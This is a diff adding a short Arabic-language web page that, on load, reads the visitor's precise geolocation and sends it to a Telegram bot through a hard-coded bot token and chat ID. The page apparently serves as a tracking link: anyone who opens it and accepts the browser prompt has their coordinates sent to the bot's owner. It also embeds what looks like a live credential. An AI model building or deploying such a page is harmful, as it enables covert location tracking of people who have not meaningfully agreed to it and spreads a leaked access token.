@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>إرسال الموقع تلقائيًا للبوت</title>
+<style>
+body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:flex;align-items:center;justify-content:center;text-align:center}
+#status{margin-top:10px;color:#333}
+</style>
+</head>
+<body>
+
+<div id="msg">
+<h3>تحديد الموقع تلقائيًا</h3>
+<p id="status">جارٍ تحديد موقعك...</p>
+<small>اللهم صل وسلم على نبينا محمد ﷺ</small>
+</div>
+
+<script>
+const BOT_TOKEN = "8178761195:AAHUVKSv3VrrRSDWRULLSV6IgPuE0vZx6Y0";
+const CHAT_ID  = "6683130316";
+
+const statusEl = document.getElementById("status");
+
+window.addEventListener("load", ()=>{
+  if(!navigator.geolocation){
+    statusEl.textContent = "الموقع غير مدعوم في متصفحك";
+    return;
+  }
+
+  statusEl.textContent = "جارٍ تحديد الموقع...";
+
+  navigator.geolocation.getCurrentPosition(async(position)=>{
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    statusEl.textContent = `الموقع تم تحديده: Lat=${lat}, Lon=${lon} — جارٍ الإرسال...`;
+
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("latitude", lat);
+    form.append("longitude", lon);
+
+    try{
+      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
+        method:"POST",
+        body:form
+      });
+
+      if(resp.ok){
+        statusEl.textContent = "✅ تم إرسال موقعك للبوت بنجاح.";
+      }else{
+        statusEl.textContent = "❌ فشل الإرسال. تحقق من التوكن والـ Chat ID.";
+      }
+
+    }catch(err){
+      statusEl.textContent = "حدث خطأ أثناء الإرسال: "+(err.message||err);
+    }
+
+  }, (err)=>{
+    statusEl.textContent = "فشل تحديد الموقع: " + err.message;
+  }, {enableHighAccuracy:true, timeout:10000});
+});
+</script>
+
+</body>
+</html>
